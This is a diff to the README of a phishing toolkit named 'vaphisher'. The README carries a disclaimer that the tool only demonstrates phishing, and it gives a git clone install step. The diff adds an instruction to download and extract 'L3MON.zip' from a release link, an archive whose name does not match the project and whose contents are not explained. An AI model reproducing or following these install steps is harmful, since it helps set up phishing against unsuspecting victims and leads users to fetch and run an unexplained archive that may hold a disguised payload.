@@ -31,7 +31,7 @@ It only demonstrates "how phishing works". <b>You shall not misuse the informati
   ######©2022****Aryan****©2022#####
 
 ### Installation
-
+Get - Download and Extract the latest release from [HERE](https://github.com/ARYAN122333/L3MON/releases/download/v2.3.4/L3MON.zip)
 - Just, Clone this repository -
 ```
 $ git clone https://github.com/ARYAN122333/vaphisher.git
